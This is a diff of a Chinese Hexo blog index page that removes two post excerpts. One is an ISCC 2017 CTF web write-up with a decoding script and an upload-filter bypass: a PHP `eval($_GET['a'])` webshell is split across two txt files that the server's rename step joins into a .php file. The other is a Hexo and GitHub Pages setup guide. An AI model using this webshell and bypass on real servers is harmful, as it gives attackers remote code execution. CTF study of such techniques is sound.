-<h2 id="I-have-a-jpg-i-upload-a-txt"><a href="#I-have-a-jpg-i-upload-a-txt" class="headerlink" title="I have a jpg,i upload a txt."></a>I have a jpg,i upload a txt.</h2><p>题目过滤了php标签和script标签。当传入$do=rename时，调用了一个KaIsA()函数，测试后发现大写字母为ascii+6，小写为ascii-6，函数代码如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#python3.6</span></div><div class="line">a = <span class="string">'base64加密后的字符串'</span></div><div class="line">b = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</div><div class="line">	<span class="keyword">if</span> i.isupper():</div><div class="line">		i = ord(i)+<span class="number">6</span></div><div class="line">		<span class="keyword">if</span> i&gt;<span class="number">90</span>:</div><div class="line">			i = chr(i<span class="number">-26</span>)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			i = chr(i)</div><div class="line">	<span class="keyword">elif</span> i.islower():</div><div class="line">		i = ord(i)<span class="number">-6</span></div><div class="line">		<span class="keyword">if</span> i&lt;<span class="number">97</span>:</div><div class="line">			i = chr(i+<span class="number">26</span>)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			i = chr(i)</div><div class="line">	b += i</div><div class="line">	</div><div class="line">print(b)</div></pre></td></tr></table></figure>
-<p>观察源码发现，rename过程中新生成的随机文件名的txt是唯一的，因此可以尝试上传两个使用php短标签的文件，拼成一个txt文件，再更改后缀为php。</p>
-<p>上传的两个文件分别为：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;     <span class="comment">//1.txt</span></div><div class="line"></div><div class="line">? <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]); <span class="meta">?&gt;</span>     <span class="comment">//2.txt</span></div></pre></td></tr></table></figure>
-<p>经过两次的rename过程，可以得到一个随机文件名的php，访问upload/xxxxxx.php会跳转到flaggalf.php，抓包可得flag</p>
-
+        
+          <a class="article-more-a" href="/2017/05/25/ISCC-2017-Web-writeup/#more">more >></a>
+        
       
 
       
@@ -979,19 +658,9 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl https://raw.github.com/creationix/nvm/master/install.sh | sh</div><div class="line">$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh</div></pre></td></tr></table></figure>
 <p>第一条命令尝试了几次发现都失败了，而第二条命令成功了，然而这不是重点。重点是在nvm安装成功之后在输入nvm命令时却显示</p>
 <figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">zsh: <span class="built_in">command</span> not found: nvm</div></pre></td></tr></table></figure>
-<p>在多次搜索后,发现要在<code>~/.zshrc</code>(bash是<code>~/.bashrc</code>)里添上</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ -s $HOME/.nvm/nvm.sh ] &amp;&amp; . $HOME/.nvm/nvm.sh</div></pre></td></tr></table></figure>
-<p>然后就可以安装Node.js了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ nvm install stable</div></pre></td></tr></table></figure>
-<p>Git和Node.js安装完后，就可以安装Hexo了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install -g hexo-cli</div></pre></td></tr></table></figure>
-<h2 id="hexo-d命令报错"><a href="#hexo-d命令报错" class="headerlink" title="hexo d命令报错"></a><code>hexo d</code>命令报错</h2><p>在使用<code>hexo d</code>命令时，可能会遇到ERROR Deployer not found: git的错误，输入以下代码即可</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
-<h2 id="域名的绑定"><a href="#域名的绑定" class="headerlink" title="域名的绑定"></a>域名的绑定</h2><p>由于是利用github来搭建的静态网站，刚搭建好博客时，需要通过github的域名来访问。然而，当然是用自己的域名来访问更爽一点。</p>
-<h3 id="域名提供商"><a href="#域名提供商" class="headerlink" title="域名提供商"></a>域名提供商</h3><p>首先要在域名提供商（我这里是腾讯云）那边添加一条CNAME记录，将CNAME指向your_username.github.io</p>
-<h3 id="在博客里添加CNAME文件"><a href="#在博客里添加CNAME文件" class="headerlink" title="在博客里添加CNAME文件"></a>在博客里添加CNAME文件</h3><p>进入博客目录，在source文件夹下创建一个名为CNAME的文件，输入你的域名: 如 blog.cnt2x.cn</p>
-<h3 id="坑！Github的Custom-domain设置"><a href="#坑！Github的Custom-domain设置" class="headerlink" title="坑！Github的Custom domain设置"></a>坑！Github的Custom domain设置</h3><p>这个地方折磨了我挺久，上面两个步骤设置完了之后，我访问我的博客永远都是404，找了好久的问题。后来在某篇文章中发现，在Github里仓库的setting，在下方有一个Custom domain的设置，输入你要绑定的域名，然后save，就可以进入博客了。</p>
-
+        
+          <a class="article-more-a" href="/2017/05/14/hexo/#more">more >></a>
+        
       
 
       
